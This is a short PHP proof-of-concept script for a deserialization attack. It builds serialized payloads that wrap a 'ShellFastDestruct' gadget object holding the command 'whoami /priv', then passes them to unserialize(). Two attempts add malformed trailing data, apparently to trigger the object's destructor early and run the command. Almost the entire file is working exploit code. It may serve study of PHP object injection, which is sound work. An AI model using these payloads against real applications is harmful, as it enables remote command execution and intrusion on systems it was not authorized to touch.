<?php

include 'shellFastDestruct.php';


# Create malicious object
// $shellObj = new ShellFastDestruct("whoami /priv");

// echo serialize($shellObj);

// serialized string = C:17:"ShellFastDestruct":30:{a:1:{i:0;s:12:"whoami /priv";}}

// Malform remaining serialized string

// Attempt 1: Send malformed object serialized string after correct serialized string
// Payload: a:2:{i:0;C:17:"ShellFastDestruct":30:{a:1:{i:0;s:12:"whoami /priv";}}i:1;O:3:"LOL";}

$unserializedStr = unserialize('a:2:{i:0;C:17:"ShellFastDestruct":30:{a:1:{i:0;s:12:"whoami /priv";}}i:1;O:3:"LOL";}');

// Attempt 2: Send malformed array
// Payload: a:2:{i:0;C:17:"ShellFastDestruct":30:{a:1:{i:0;s:12:"whoami /priv";}}i:1;a:2:{}}
$unserializedStr = unserialize('a:2:{i:0;C:17:"ShellFastDestruct":30:{a:1:{i:0;s:12:"whoami /priv";}}i:1;a:2:{}}');


echo "Exiting" . "\n";

?>